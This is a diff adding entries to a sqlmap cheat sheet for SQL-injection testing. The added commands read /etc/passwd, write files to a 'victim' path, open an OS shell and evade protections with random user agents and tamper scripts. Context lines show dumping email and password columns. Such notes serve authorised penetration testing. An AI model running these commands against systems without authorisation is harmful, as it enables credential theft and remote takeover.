@@ -53,6 +53,19 @@ sqlmap ... --dump -D dbname -T users -C email,password
 ```bash
 sqlmap ... --dump -D dbname -T users --where="email LIKE '%something%'" --start=1 --stop=15
 ```
+### Read file
+```bash
+sqlmap ... --file-read "/etc/passwd"
+```
+### Write file
+```bash
+sqlmap ... --file-write "file-to-write.txt" --file-dest "/target/destination/on/victim/file-to-write.txt"
+```
+### OS shell
+```bash
+sqlmap ... --os-shell
+
+```
 ### Send traffic through proxy
 ```bash
 sqlmap ... --proxy http://127.0.0.1:8080
@@ -84,6 +97,26 @@ sqlmap ... --union-cols=6 --union-char='A'
 ```
 ```bash
 sqlmap ... --prefix="\`)" --suffix="-- +" 
+```
+### Bypass protections
+#### Randomize user agent
+```bash
+sqlmap ... --random-agent
+```
+#### CSRF token
+```bash
+sqlmap ... --data="...csrftoken=7c65966e-4a4a-408a-bd92-fe2a3a9ee094" --csrf-token="csrftoken"
+```
+#### Randomize value
+```bash
+sqlmap ... --randomize=some-field
+```
+### Tamper scripts
+```bash
+sqlmap --list-tampers
+```
+```
+sqlmap ... --tamper=space2comment,between
 ```
 
 ## Mysql
